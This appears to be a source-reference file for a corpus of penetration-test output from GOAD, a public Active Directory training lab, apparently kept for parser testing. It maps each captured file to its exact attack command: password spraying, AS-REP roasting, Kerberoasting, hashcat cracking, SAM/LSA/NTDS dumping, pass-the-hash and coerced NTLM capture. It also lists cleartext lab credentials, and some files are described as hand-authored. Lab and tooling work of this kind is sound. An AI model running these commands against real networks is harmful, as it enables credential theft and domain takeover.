# GOAD corpus — source reference

`goad/` is one engagement against a GOAD lab (Game of Active Directory, a public
training lab), built from two runs against the same five hosts and the same
jumpbox. Files are grouped by tool, not by run; each table below names the run
a file came from. A new capture adds its files here and its table below.

## Run of 2026-09-04
Real output from a GOAD lab (Game of Active Directory, a public training lab), captured on 2026-09-04.

All capture happened **on the jumpbox** (private `192.168.56.100`), which sits on
the lab network and ran the tools directly against the five GOAD hosts. Commands
are reconstructed from the jumpbox's `~/.bash_history`; they are representative,
not byte-exact. Environment used throughout:

```
RANGE=192.168.56
DC01=.10  kingslanding  sevenkingdoms.local        (forest root DC)
DC02=.11  winterfell    north.sevenkingdoms.local  (child DC)
DC03=.12  meereen       essos.local                (forest root DC)
SRV02=.22 castelblack   north.sevenkingdoms.local  (IIS + MSSQL)
SRV03=.23 braavos       essos.local                (MSSQL + AD CS)
LOOT=~/goad-loot         NO_COLOR=1 (strip ANSI from tee'd logs)
```

Tools: **nmap 7.80**, **NetExec/nxc 1.5.1** (`netexec`), **Impacket**
(`GetNPUsers.py`, `GetUserSPNs.py`), **hashcat**, **bloodhound-ce-python**.

---

### host discovery & service enumeration

| File                         | Tool / technique                                                   | Approx. command                                                                            |
| ---------------------------- | ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------ |
| `scans/hostsweep.{nmap,gnmap,xml}` | nmap — ICMP/ARP ping sweep, no port scan                           | `nmap -sn $RANGE.0/24 -oA scans/hostsweep`                                                 |
| `scans/goad-full.{nmap,gnmap,xml}` | nmap — all-ports + service version + default NSE scripts           | `nmap -Pn -sV -sC -p- --min-rate 2000 $DC01 $DC02 $DC03 $SRV02 $SRV03 -oA scans/goad-full` |
| `nxc/nxc-smb-sweep.txt` | NetExec SMB — unauth host fingerprint (OS/signing/SMBv1/null-auth) | `netexec smb $DC01 $DC02 $DC03 $SRV02 $SRV03`                                              |
| `nxc/nxc-ldap.txt` | NetExec LDAP — DC fingerprint (signing / channel binding)          | `netexec ldap $DC01 $DC02 $DC03`                                                           |
| `nxc/nxc-mssql.txt` | NetExec MSSQL — SQL instance fingerprint                           | `netexec mssql $SRV02 $SRV03`                                                              |
| `nxc/nxc-winrm.txt` | NetExec WinRM — 5985 reachability across all hosts                 | `netexec winrm $DC01 $DC02 $DC03 $SRV02 $SRV03`                                            |

### authenticated & anonymous enumeration

| File                    | Tool / technique                                                                                                          | Approx. command                                                                            |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `nxc/nxc-shares-dc01.txt` | NetExec SMB — **null-session** share enum (returned ACCESS_DENIED)                                                        | `netexec smb $DC01 -u '' -p '' --shares`                                                   |
| `nxc/nxc-shares-srv02.txt` | NetExec SMB — **guest** share enum on castelblack                                                                         | `netexec smb $SRV02 -u guest -p '' --shares`                                               |
| `nxc/password-policy.txt` | NetExec SMB — domain password/lockout policy (authed as rickon.stark)                                                     | `netexec smb $DC02 -u rickon.stark -p 'Winter2022' --pass-pol`                             |
| `nxc/nxc-kerb-north.txt` | NetExec LDAP — Kerberoasting driver output for north (see hashes/kerb_north.txt)                                          | `netexec ldap $DC02 -u rickon.stark -p 'Winter2022' --kerberoasting hashes/kerb_north.txt` |
| `nxc/nxc-kerb-essos.txt` | NetExec LDAP — Kerberoasting driver output for essos (tee log shows the north auth line; hashes landed in kerb_essos.txt) | `netexec ldap $DC03 -u missandei -p 'fr3edom' --kerberoasting hashes/kerb_essos.txt`       |
| `nxc/nxc-cred-check.txt` | NetExec SMB — validate a recovered cred across all 5 hosts                                                                | `netexec smb $DC01 $DC02 $DC03 $SRV02 $SRV03 -u $U -p $P`                                  |
| `nxc/nxc-loggedon.txt` | NetExec SMB — logged-on-user enum across the /24                                                                          | `netexec smb $RANGE.0/24 -u $U -p $P --loggedon-users`                                     |
| `nxc/nxc-winrm-check.txt` | NetExec WinRM — can this cred get a shell on castelblack? (denied)                                                        | `netexec winrm $SRV02 -u rickon.stark -p 'Winter2022'`                                     |

### roasted Kerberos material (pre-crack)

| File              | Tool / technique                                                                                               | Approx. command                                                                                                                                                                              |
| ----------------- | -------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `roast/asrep_7k.txt` | Impacket AS-REP roast, sevenkingdoms root — **0 bytes**, no accounts with preauth disabled                     | `GetNPUsers.py sevenkingdoms.local/ -usersfile users.txt -dc-ip $DC01 -no-pass -format hashcat -outputfile hashes/asrep_7k.txt`                                                              |
| `roast/asrep_north.txt` | Impacket AS-REP roast, north — hit: `brandon.stark`                                                            | `GetNPUsers.py north.sevenkingdoms.local/ -usersfile users.txt -dc-ip $DC02 -no-pass -format hashcat -outputfile hashes/asrep_north.txt`                                                     |
| `roast/asrep_essos.txt` | Impacket AS-REP roast, essos — hit: `missandei`                                                                | `GetNPUsers.py essos.local/ -usersfile users.txt -dc-ip $DC03 -no-pass -format hashcat -outputfile hashes/asrep_essos.txt`                                                                   |
| `roast/kerb_north.txt` | Kerberoast (TGS-REP, etype 18) for north SPNs, authed as rickon.stark — 10 tickets incl. jon.snow, sansa.stark | `netexec ldap $DC02 -u rickon.stark -p 'Winter2022' --kerberoasting hashes/kerb_north.txt` (equiv: `GetUserSPNs.py north.sevenkingdoms.local/rickon.stark:Winter2022 -dc-ip $DC02 -request`) |
| `roast/kerb_essos.txt` | Kerberoast essos SPNs, authed as missandei — 3 tickets incl. sql_svc                                           | `netexec ldap $DC03 -u missandei -p 'fr3edom' --kerberoasting hashes/kerb_essos.txt`                                                                                                         |

### cracked passwords, spray results, candidate lists

| File                | Tool / technique                                                                                                                              | Approx. command                                                                                                                 |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `crack/goad_seed.txt` | **Hand-built** candidate wordlist (GOAD-themed guesses: Dracarys, Winter2022, iknownothing, …) — an input, not captured output                | `printf '%s\n' Heartsbane _L0ngCl@w_ ... > creds/goad_seed.txt`                                                                 |
| `nxc/spray-hits.txt` | NetExec SMB — single-password spray of `Winter2022` across users.txt on DC01/02/03. One valid hit: `north\rickon.stark`                       | `netexec smb $DC01 -u users.txt -p 'Winter2022' --continue-on-success \| tee -a creds/spray-hits.txt` (repeated per DC)         |
| `crack/asrep_cracked.txt` | hashcat -m 18200 (AS-REP) vs rockyou — brandon.stark=`iseedeadpeople`, missandei=`fr3edom`                                                    | `hashcat -m 18200 hashes/asrep_north.txt /usr/share/wordlists/rockyou.txt --outfile creds/asrep_cracked.txt` (also asrep_essos) |
| `crack/kerb_cracked.txt` | hashcat -m 19700 (TGS-REP etype 18) vs goad_seed — sql_svc=`YouWillNotKerboroast1ngMeeeeee`, jon.snow=`iknownothing`, sansa.stark=`345ertdfg` | `for f in kerb_north kerb_essos; do hashcat -m 19700 hashes/$f.txt creds/goad_seed.txt --outfile creds/kerb_cracked.txt; done`  |
| `notes/creds.txt` | **Manual notes** — confirmed working creds jotted by hand (0 bytes here; the spray note was appended on a later run)                          | `echo 'north.sevenkingdoms.local\rickon.stark:Winter2022 (spray)' >> creds/creds.txt`                                           |

### AD graph collection

| File                                  | Tool / technique                                                         | Approx. command                                                                                                      |
| ------------------------------------- | ------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------- |
| `bloodhound/north_20260904205950_bloodhound.zip` | bloodhound-ce-python (CE collector), all methods, authed as rickon.stark | `bloodhound-ce-python -d north.sevenkingdoms.local -u rickon.stark -p 'Winter2022' -ns $DC02 -c All --zip -op north` |
| `bloodhound/essos_20260904210044_bloodhound.zip` | bloodhound-ce-python, all methods, authed as missandei                   | `bloodhound-ce-python -d essos.local -u missandei -p 'fr3edom' -ns $DC03 -c All --zip -op essos`                     |

---

### What was changed

- `scans/goad-full.*` and `scans/hostsweep.*`: the capture box's home path was removed from the nmap command line in each file header. Nothing else changed.
- `SOURCES.md`: the capture box's address and login were removed.
- All other real files are byte for byte as captured.

### Authored files

The capture never produced these, so they were written by hand in the exact line format of the tool named. Each uses only hosts, domains, accounts and passwords that appear in the real files above. They exist so the corpus holds a login made with a cracked password, an admin login, a dump and a crack of that dump.

| File | Stands for | What it adds |
|---|---|---|
| `nxc/nxc-cred-check-missandei.txt` | `netexec smb $DC01 $DC02 $DC03 $SRV02 $SRV03 -u missandei -p 'fr3edom'` | missandei's cracked AS-REP password works on MEEREEN and BRAAVOS |
| `nxc/nxc-cred-check-sql_svc.txt` | `netexec smb $DC03 $SRV03 -u sql_svc -p '<cracked>'` | sql_svc's cracked kerberoast password works on MEEREEN and is local admin on BRAAVOS (`Pwn3d!`) |
| `dumps/secretsdump-braavos.txt` | `secretsdump.py essos.local/sql_svc@$SRV03` | BRAAVOS SAM and LSA secrets. NT hashes are computed from their passwords, so cracks match. The Administrator password is random and uncracked |
| `crack/hashcat-braavos-ntlm.potfile` | `hashcat -m 1000` over the SAM hashes | cracks `vagrant` |

The chain they complete is: AS-REP roast → crack → missandei logs in → kerberoast essos → crack → sql_svc is admin on BRAAVOS → dump → crack.

## Run of 2026-10-19
Real output from one run against a GOAD lab (Game of Active Directory, a public
training lab), worked as an internal test in attack order. Every command ran on
the jumpbox (`192.168.56.100`) through a wrapper that logged the command, its
start time, exit status and every file it wrote, so each file below maps to one
logged command. Commands are quoted from that log, not reconstructed.

```
.10 kingslanding  sevenkingdoms.local        .22 castelblack  north (IIS + MSSQL)
.11 winterfell    north.sevenkingdoms.local  .23 braavos      essos.local
.12 meereen       essos.local
```

Tools: nmap 7.80, NetExec 1.5.1+1108 (git build; NetBIOS names print lower-case),
Impacket 0.13.1 (`*.py` names), hashcat 6.2.5, Responder `424fbe5`,
bloodhound-ce-python, certipy 4.8.2.

### What was changed

The files are the tool's bytes except for values specific to this deployment,
replaced with invented ones in every file the same way:

- the domain admin `goadmin` password from the lab config (it is also the local
  `goadmin`, `ansible` and `Administrator` password on castelblack), and its NT
  hash, recomputed from the new password;
- the krbtgt, machine-account, trust and `WDAGUtilityAccount` NT hashes, the
  machine account's Kerberos keys and `plain_password_hex`, the DPAPI keys, the
  bootKey and NL$KM (its hexdump rewritten from the new bytes);
- the domain SIDs, in the BloodHound and certipy output, and the CA certificates'
  serial numbers;
- the jumpbox's home directory (`/home/kali`) and host name.

GOAD's default user passwords, and the hashes made from them, are kept: they are
public. The NetExec `--log` header and the command lines below show the replaced
password. The kerberoast and AS-REP hashes and the Responder NTLMv2 captures are
kept; each is made from a public GOAD password. The cracking wordlist was seeded
from the lab's config, so the cracked files prove nothing about crackability.

### Lab facts behind the answers

- RID 500 on castelblack and in north is `goadmin`; the account named
  `Administrator` is RID 1009.
- Anonymous enumeration is blocked, so the spray's user list came from the lab
  config (not included: it is not tool output).
- Poisoning cannot happen on this network (broadcast and multicast are dropped);
  the Responder captures came from MSSQL coercion.

### Files

| File | Log # | Command |
|---|---|---|
| `scans/sweep.xml` | 006 | `sudo nmap -sn 192.168.56.0/24 -oA …/scans/sweep` |
| `scans/full.gnmap` | 008 | `sudo nmap -sC -sV -p- --min-rate 2000 -oA …/scans/full 192.168.56.10 192.168.56.11 192.168.56.12 192.168.56.22 192.168.56.23` |
| `nxc/smb-sweep.txt` | 007 | `netexec smb 192.168.56.0/24 --no-progress \| tee …` (Responder's SMB server on the jumpbox answers too) |
| `nxc/pass-pol.txt` | 021 | `netexec smb 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' --pass-pol --no-progress \| tee …` |
| `nxc/spray-north.txt` | 027 | `netexec smb 192.168.56.11 -u <user list> -p 'iseedeadpeople' --continue-on-success --no-progress \| tee …` |
| `nxc/users-north.txt` | 029 | `netexec smb 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' --users --no-progress \| tee …` |
| `nxc/guest-shares.txt` | 009 | `netexec smb <5 hosts> -u guest -p '' --shares --no-progress \| tee …` |
| `nxc/check-brandon.stark.txt` | 028 | `netexec smb <5 hosts> -u brandon.stark -p 'iseedeadpeople' --no-progress \| tee …` |
| `nxc/shares-brandon.stark.txt` | 030 | the same with `--shares` |
| `nxc/kerb-north-screen.txt` | 043 | `netexec ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' --kerberoasting …/roast/kerb-north.txt --no-progress \| tee …` |
| `roast/kerb-north.txt` | 043 | written by `--kerberoasting` above (`$krb5tgs$18$`: the accounts are AES-only) |
| `roast/asrep-north.txt`, `roast/asrep-north-screen.txt` | 018 | `GetNPUsers.py north.sevenkingdoms.local/ -usersfile <user list> -no-pass -dc-ip 192.168.56.11 -format hashcat -outputfile …/roast/asrep-north.txt \| tee …` |
| `roast/spns-north-screen.txt` | 044 | `GetUserSPNs.py -request -dc-ip 192.168.56.11 "north.sevenkingdoms.local/brandon.stark:iseedeadpeople" -outputfile … \| tee …` (every TGS request failed `KDC_ERR_ETYPE_NOSUPP`) |
| `crack/hashcat.potfile` | 019, 046 | `hashcat -m 18200 …/asrep-north.txt <wordlist>`, then `-m 19700 …/kerb-north.txt`; the default potfile, copied |
| `crack/kerb-north-show.txt` | 047 | `hashcat -m 19700 …/kerb-north.txt --show \| tee …` |
| `nxc/check-sql_svc.txt` | 057 | `netexec smb <5 hosts> -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' --no-progress \| tee …` |
| `nxc/mssql-sql_svc.txt` | 058 | `netexec mssql 192.168.56.22 192.168.56.23 -u sql_svc -p '…' --no-progress \| tee …` |
| `dumps/secretsdump-castelblack.txt` | 068 | `secretsdump.py 'north.sevenkingdoms.local/goadmin:Wildf1re-Kn0ws@192.168.56.22' \| tee …` |
| `nxc/ntds-north.txt` | 061 | `netexec smb 192.168.56.11 -u goadmin -p 'Wildf1re-Kn0ws' -d north.sevenkingdoms.local --ntds --no-progress \| tee …` |
| `nxc/nxc-logs/ntds/winterfell_….ntds` | 061 | written by `--ntds` above into `~/.nxc/logs/ntds/`, copied |
| `dumps/sd-winterfell.ntds` | 062 | `secretsdump.py 'north.sevenkingdoms.local/goadmin:Wildf1re-Kn0ws@192.168.56.11' -just-dc -outputfile …/dumps/sd-winterfell \| tee …` |
| `nxc/dump-members-goadmin.txt` | 067 | `netexec smb 192.168.56.22 192.168.56.23 -u goadmin -p 'Wildf1re-Kn0ws' -d north.sevenkingdoms.local --sam --lsa --no-progress \| tee …` |
| `nxc/nxc-logs/sam/…sam`, `nxc/nxc-logs/lsa/…cached`, `…secrets` | 067 | written by `--sam --lsa` above into `~/.nxc/logs/`, copied |
| `nxc/loggedon.txt` | 069 | `netexec smb <5 hosts> -u goadmin -p 'Wildf1re-Kn0ws' -d north.sevenkingdoms.local --loggedon-users --no-progress \| tee …` |
| `nxc/pth-local-admin.txt` | 077 | `netexec smb <5 hosts> -u goadmin -H '<NT hash>' --local-auth --no-progress \| tee …` |
| `responder/coerce-module.txt` | 081 | `netexec mssql 192.168.56.22 -u sql_svc -p '…' -M mssql_coerce -o LISTENER=192.168.56.100 --no-progress \| tee …` |
| `responder/logs/Responder-Session.log` | 081 | Responder (`Responder.py -I eth0 -v`, started first and left running) logging the coerced logins; its `logs/` folder, copied at the end |
| `bloodhound/20261019141655_bloodhound.zip` | 048 | `bloodhound-ce-python -d north.sevenkingdoms.local -u brandon.stark -p 'iseedeadpeople' -ns 192.168.56.11 -c All --zip` |
| `adcs/certipy-north_Certipy.json`, `adcs/certipy-north_Certipy.txt` | 051, 052 | `certipy find -u 'brandon.stark@north.sevenkingdoms.local' -p '…' -dc-ip 192.168.56.11 -json -output …/adcs/certipy-north`, then the same with `-text` |
| `adcs/certipy-essos_Certipy.json` | 072 | `certipy find -u 'sql_svc@essos.local' -p '…' -dc-ip 192.168.56.12 -json -output …/adcs/certipy-essos` |
| `adcs/certipy-essos-vulnerable.txt` | 071 | `certipy find -u 'sql_svc@essos.local' -p '…' -dc-ip 192.168.56.12 -vulnerable -stdout \| tee …` |

The run's other files test one parser each and live in `tests/fixtures/`
(`netexec/nxc-sam-goad.log`, `netexec/nxc-failed-login.txt`,
`netexec/nxc-pth-lmnt-refused.txt`, `nmap/nmap-os-verbose.gnmap`,
`bloodhound/north_default_20261019142903_bloodhound.zip`); `tests/SOURCES.md`
gives their commands.
